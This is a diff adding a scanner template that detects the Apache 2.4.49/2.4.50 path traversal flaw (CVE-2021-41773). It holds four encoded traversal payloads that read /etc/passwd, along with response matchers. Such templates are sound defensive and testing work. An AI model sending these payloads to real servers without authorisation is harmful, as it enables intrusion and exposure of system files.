@@ -1,0 +1,22 @@
+id: apache-traversal
+info:
+  name: "Apache Path Traversal (CVE-2021-41773)"
+  severity: critical
+  description: "Detects Apache 2.4.49/2.4.50 path traversal and RCE"
+  tags: [cve, apache, traversal, rce]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  - "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  - "/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  - "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
+
+matchers:
+  body_patterns:
+    - "root:.*:0:0:"
+    - "daemon:.*:/usr/sbin"
+    - "(?i)\\[fonts\\]"
